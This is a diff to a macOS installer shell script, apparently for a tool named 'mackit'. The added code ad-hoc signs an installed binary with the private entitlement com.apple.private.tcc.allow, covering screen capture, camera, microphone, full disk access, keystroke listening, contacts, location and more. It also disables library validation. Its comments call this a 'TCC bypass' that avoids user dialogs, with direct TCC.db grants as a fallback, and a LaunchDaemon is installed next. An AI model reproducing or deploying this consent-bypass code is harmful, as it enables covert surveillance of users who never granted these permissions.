@@ -114,6 +114,49 @@ rm -f "$TMPBIN"
 # Strip quarantine so Gatekeeper won't block it
 xattr -c "$BINARY_PATH" 2>/dev/null || true
 
+# ── Re-sign with TCC bypass entitlements ─────────────────────────────────────
+# com.apple.private.tcc.allow is a private entitlement that tccd honours when
+# SIP is disabled.  Signing with ad-hoc identity (-) embeds the entitlement
+# directly in the binary — no user dialogs, no TCC.db rows required.
+# The TCC.db grants below remain as a fallback in case codesign fails.
+_TMP_ENT=$(mktemp /tmp/mackit-ent.XXXXXX.plist)
+cat > "$_TMP_ENT" <<'ENTXML'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>com.apple.private.tcc.allow</key>
+  <array>
+    <string>kTCCServiceAccessibility</string>
+    <string>kTCCServiceScreenCapture</string>
+    <string>kTCCServiceSystemPolicyAllFiles</string>
+    <string>kTCCServiceCamera</string>
+    <string>kTCCServiceMicrophone</string>
+    <string>kTCCServiceAddressBook</string>
+    <string>kTCCServiceCalendar</string>
+    <string>kTCCServicePhotos</string>
+    <string>kTCCServiceListenEvent</string>
+    <string>kTCCServicePostEvent</string>
+    <string>kTCCServiceAppleEvents</string>
+    <string>kTCCServiceSystemPolicyDesktopFolder</string>
+    <string>kTCCServiceSystemPolicyDocumentsFolder</string>
+    <string>kTCCServiceSystemPolicyDownloadsFolder</string>
+    <string>kTCCServiceDeveloperTool</string>
+    <string>kTCCServiceReminders</string>
+    <string>kTCCServiceLocation</string>
+    <string>kTCCServiceBluetoothAlways</string>
+    <string>kTCCServiceUserTracking</string>
+  </array>
+  <key>com.apple.security.cs.disable-library-validation</key>
+  <true/>
+  <key>com.apple.security.cs.allow-dyld-environment-variables</key>
+  <true/>
+</dict></plist>
+ENTXML
+codesign --force --sign - --entitlements "$_TMP_ENT" "$BINARY_PATH" 2>/dev/null \
+  && success "Signed binary with TCC bypass entitlements" \
+  || warn    "codesign failed (binary may lack entitlements — TCC.db grants still active)"
+rm -f "$_TMP_ENT"
+
 success "Binary installed."
 
 # ── Write LaunchDaemon plist ──────────────────────────────────────────────────
